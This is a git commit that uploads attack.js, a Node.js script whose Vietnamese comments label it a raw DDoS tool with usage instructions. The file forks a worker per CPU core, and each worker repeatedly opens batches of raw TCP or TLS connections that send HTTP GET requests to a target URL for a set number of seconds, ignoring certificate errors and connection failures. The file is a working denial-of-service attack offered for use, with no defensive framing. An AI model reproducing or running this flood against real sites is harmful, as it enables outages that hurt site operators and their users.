e0161bfa149a751d90be0c2bf57d83ba04bb072d
DuocCyber <duoclangla7@gmail.com>
2026-06-21 15:28:36 +0700

    Add files via upload

---
+++ attack.js
@@ -0,0 +1,34 @@
+// DDoS RAW – Node.js, không proxy, dùng cluster
+// Cách dùng: node attack.js https://example.com 60
+
+const net = require('net');
+const tls = require('tls');
+const cluster = require('cluster');
+const os = require('os');
+
+const [,, target, seconds = 30] = process.argv;
+if (!target) return console.error('Dùng: node attack.js <URL> [giây]');
+
+const { hostname, port = 443, protocol, pathname = '/' } = new URL(target);
+const isHttps = protocol === 'https:';
+const portNum = parseInt(port) || (isHttps ? 443 : 80);
+
+function g() { // gửi 1 request
+  const s = isHttps
+    ? tls.connect({ host: hostname, port: portNum, rejectUnauthorized: false })
+    : net.connect({ host: hostname, port: portNum });
+  s.on('connect', () => {
+    s.write(`GET ${pathname} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n`);
+    setTimeout(() => s.destroy(), 1000);
+  });
+  s.on('error', () => {});
+}
+
+if (cluster.isMaster) {
+  for (let i = 0; i < os.cpus().length; i++) cluster.fork();
+  setTimeout(() => process.exit(0), seconds * 1000);
+} else {
+  setInterval(() => {
+    for (let i = 0; i < 15 + Math.random() * 20; i++) g();
+  }, 200);
+}
